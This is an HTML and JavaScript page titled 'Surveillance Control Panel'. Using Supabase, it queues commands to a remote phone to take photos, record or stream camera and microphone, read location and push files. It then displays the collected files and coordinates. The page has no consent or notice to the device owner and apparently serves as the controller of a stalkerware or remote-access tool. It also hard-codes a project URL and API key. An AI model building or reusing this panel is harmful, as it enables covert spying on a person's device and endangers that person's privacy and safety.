<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surveillance Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { padding: 20px; }
        #login-section, #dashboard { display: none; }
        #dashboard { margin-top: 20px; }
        .file-card { margin-bottom: 15px; }
        #stream-view { width: 100%; height: 400px; background: #000; }
    </style>
</head>
<body>
    <!-- Login Section -->
    <div id="login-section" class="container">
        <h2>Login to Surveillance Panel</h2>
        <form id="login-form">
            <div class="mb-3">
                <label for="email" class="form-label">Email</label>
                <input type="email" class="form-control" id="email" required>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" class="form-control" id="password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
            <p id="login-error" class="text-danger"></p>
        </form>
    </div>

    <!-- Dashboard -->
    <div id="dashboard" class="container">
        <h2>Surveillance Control Panel</h2>
        <button id="logout-btn" class="btn btn-secondary mb-3">Logout</button>

        <!-- Command Section -->
        <div class="card mb-3">
            <div class="card-body">
                <h5 class="card-title">Send Command</h5>
                <form id="command-form">
                    <div class="mb-3">
                        <label for="command-type" class="form-label">Command Type</label>
                        <select class="form-select" id="command-type" required>
                            <option value="capturePhoto">Capture Photo</option>
                            <option value="recordVideo">Record Video</option>
                            <option value="recordAudio">Record Audio</option>
                            <option value="streamVideo">Stream Video</option>
                            <option value="streamAudio">Stream Audio</option>
                            <option value="getLocation">Get Location</option>
                            <option value="ring">Ring Device</option>
                            <option value="vibrate">Vibrate Device</option>
                            <option value="files">Upload File</option>
                        </select>
                    </div>
                    <div id="command-options">
                        <!-- Dynamic options will be injected here -->
                    </div>
                    <button type="submit" class="btn btn-primary">Send Command</button>
                </form>
            </div>
        </div>

        <!-- Files Section -->
        <div class="card mb-3">
            <div class="card-body">
                <h5 class="card-title">Files</h5>
                <div id="files-gallery" class="row"></div>
            </div>
        </div>

        <!-- Location Section -->
        <div class="card mb-3">
            <div class="card-body">
                <h5 class="card-title">Location</h5>
                <p id="location-info">No location data available.</p>
            </div>
        </div>

        <!-- Stream Section -->
        <div class="card">
            <div class="card-body">
                <h5 class="card-title">Live Stream</h5>
                <video id="stream-view" autoplay playsinline></video>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const supabase = Supabase.createClient('https://yxdnyavcxouutwkvdoef.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI');

        let user = null;
        const loginSection = document.getElementById('login-section');
        const dashboard = document.getElementById('dashboard');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const logoutBtn = document.getElementById('logout-btn');
        const commandForm = document.getElementById('command-form');
        const commandType = document.getElementById('command-type');
        const commandOptions = document.getElementById('command-options');
        const filesGallery = document.getElementById('files-gallery');
        const locationInfo = document.getElementById('location-info');
        const streamView = document.getElementById('stream-view');

        // Check auth state
        supabase.auth.getSession().then(({ data: { session } }) => {
            if (session) {
                user = session.user;
                loginSection.style.display = 'none';
                dashboard.style.display = 'block';
                loadFiles();
                loadLocation();
            } else {
                loginSection.style.display = 'block';
                dashboard.style.display = 'none';
            }
        });

        // Login
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const { error } = await supabase.auth.signInWithPassword({ email, password });
            if (error) {
                loginError.textContent = error.message;
            } else {
                window.location.reload();
            }
        });

        // Logout
        logoutBtn.addEventListener('click', async () => {
            await supabase.auth.signOut();
            window.location.reload();
        });

        // Command Options
        const commandConfigs = {
            capturePhoto: `
                <div class="mb-3">
                    <label for="camera" class="form-label">Camera</label>
                    <select class="form-select" id="camera">
                        <option value="back">Back</option>
                        <option value="front">Front</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="flash" class="form-label">Flash</label>
                    <select class="form-select" id="flash">
                        <option value="true">On</option>
                        <option value="false">Off</option>
                    </select>
                </div>
            `,
            recordVideo: `
                <div class="mb-3">
                    <label for="camera" class="form-label">Camera</label>
                    <select class="form-select" id="camera">
                        <option value="back">Back</option>
                        <option value="front">Front</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="quality" class="form-label">Quality</label>
                    <select class="form-select" id="quality">
                        <option value="low">Low</option>
                        <option value="medium">Medium</option>
                        <option value="high">High</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="duration" class="form-label">Duration (seconds)</label>
                    <input type="number" class="form-control" id="duration" min="1" value="10">
                </div>
            `,
            recordAudio: `
                <div class="mb-3">
                    <label for="duration" class="form-label">Duration (seconds)</label>
                    <input type="number" class="form-control" id="duration" min="1" value="10">
                </div>
            `,
            streamVideo: `
                <div class="mb-3">
                    <label for="camera" class="form-label">Camera</label>
                    <select class="form-select" id="camera">
                        <option value="back">Back</option>
                        <option value="front">Front</option>
                    </select>
                </div>
            `,
            streamAudio: ``,
            getLocation: ``,
            ring: `
                <div class="mb-3">
                    <label for="duration" class="form-label">Duration (seconds)</label>
                    <input type="number" class="form-control" id="duration" min="1" value="5">
                </div>
            `,
            vibrate: `
                <div class="mb-3">
                    <label for="duration" class="form-label">Duration (milliseconds)</label>
                    <input type="number" class="form-control" id="duration" min="100" value="1000">
                </div>
            `,
            files: `
                <div class="mb-3">
                    <label for="file" class="form-label">Select File</label>
                    <input type="file" class="form-control" id="file">
                </div>
            `
        };

        commandType.addEventListener('change', () => {
            commandOptions.innerHTML = commandConfigs[commandType.value] || '';
        });
        commandOptions.innerHTML = commandConfigs.capturePhoto;

        // Send Command
        commandForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const type = commandType.value;
            let params = {};
            switch (type) {
                case 'capturePhoto':
                    params = {
                        camera: document.getElementById('camera').value,
                        flash: document.getElementById('flash').value === 'true'
                    };
                    break;
                case 'recordVideo':
                    params = {
                        camera: document.getElementById('camera').value,
                        quality: document.getElementById('quality').value,
                        duration: parseInt(document.getElementById('duration').value)
                    };
                    break;
                case 'recordAudio':
                    params = { duration: parseInt(document.getElementById('duration').value) };
                    break;
                case 'streamVideo':
                    params = { camera: document.getElementById('camera').value };
                    break;
                case 'streamAudio':
                    break;
                case 'getLocation':
                    break;
                case 'ring':
                    params = { duration: parseInt(document.getElementById('duration').value) };
                    break;
                case 'vibrate':
                    params = { duration: parseInt(document.getElementById('duration').value) };
                    break;
                case 'files':
                    params = { file: document.getElementById('file').files[0] };
                    break;
            }
            const { error } = await supabase.from('commands').insert({
                user_id: user.id,
                type,
                params,
                status: 'pending'
            });
            if (error) {
                alert('Error sending command: ' + error.message);
            } else {
                alert('Command sent successfully!');
                if (type === 'streamVideo' || type === 'streamAudio') {
                    startStream(type, params);
                }
            }
        });

        // Load Files
        async function loadFiles() {
            const { data, error } = await supabase.from('files')
                .select('*')
                .eq('user_id', user.id)
                .order('created_at', { ascending: false })
                .limit(50);
            if (error) {
                console.error('Error loading files:', error);
                return;
            }
            filesGallery.innerHTML = '';
            for (const file of data) {
                const url = `https://your-project-id.supabase.co/storage/v1/object/public/${file.bucket}/${file.path}`;
                // For Option 2 (private buckets), uncomment:
                /*
                const { data: { signedUrl }, error: urlError } = await supabase.storage
                    .from(file.bucket)
                    .createSignedUrl(file.path, 60);
                if (urlError) {
                    console.error('Error generating signed URL:', urlError);
                    continue;
                }
                const url = signedUrl;
                */
                const col = document.createElement('div');
                col.className = 'col-md-4 file-card';
                col.innerHTML = `
                    <div class="card">
                        ${file.bucket === 'photos' ? `<img src="${url}" class="card-img-top" alt="${file.name}">` : ''}
                        <div class="card-body">
                            <h5 class="card-title">${file.name}</h5>
                            <a href="${url}" class="btn btn-primary" download>Download</a>
                            <button class="btn btn-danger" onclick="deleteFile('${file.id}', '${file.bucket}', '${file.path}')">Delete</button>
                        </div>
                    </div>
                `;
                filesGallery.appendChild(col);
            }
        }

        // Delete File
        async function deleteFile(id, bucket, path) {
            if (!confirm('Are you sure you want to delete this file?')) return;
            const { error: storageError } = await supabase.storage.from(bucket).remove([path]);
            if (storageError) {
                alert('Error deleting file from storage: ' + storageError.message);
                return;
            }
            const { error: dbError } = await supabase.from('files').delete().eq('id', id);
            if (dbError) {
                alert('Error deleting file record: ' + dbError.message);
            } else {
                loadFiles();
            }
        }

        // Load Location
        async function loadLocation() {
            const { data, error } = await supabase.from('locations')
                .select('*')
                .eq('user_id', user.id)
                .order('created_at', { ascending: false })
                .limit(1);
            if (error) {
                console.error('Error loading location:', error);
                return;
            }
            if (data.length > 0) {
                const loc = data[0];
                locationInfo.textContent = `Latitude: ${loc.latitude}, Longitude: ${loc.longitude}, Timestamp: ${new Date(loc.created_at).toLocaleString()}`;
            }
        }

        // Live Streaming (Placeholder for WebRTC)
        async function startStream(type, params) {
            // Implement WebRTC or third-party (e.g., Agora, PeerJS). Placeholder:
            alert(`Starting ${type} stream... (WebRTC implementation required)`);
            // Example: Connect to a WebRTC peer or Supabase Realtime channel
            // streamView.srcObject = stream; // Set video stream
        }
    </script>
</body>
</html>
